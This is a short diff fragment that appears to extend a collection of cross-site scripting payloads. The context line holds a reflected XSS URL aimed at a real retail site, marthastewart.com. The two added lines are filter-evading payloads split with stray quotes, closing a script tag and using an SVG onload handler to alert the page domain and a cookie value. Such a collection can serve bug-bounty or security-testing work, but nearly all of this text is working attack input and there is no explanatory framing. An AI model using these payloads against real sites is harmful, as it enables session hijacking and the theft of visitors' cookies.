@@ -163,3 +163,5 @@ Example2 :-  https://marthastewart.com/shop/all.html?s=%E2%80%98);%3C/script%3E%
 </body>
 </html>
 
+hav=xss"</sc"ript><sv"g/onloa"d=aler"t"(document.doma"in)>
+xss"</sc"ript><sv"g/onloa"d=aler"t"(window.INITIAL_STATE.system.cookie)>
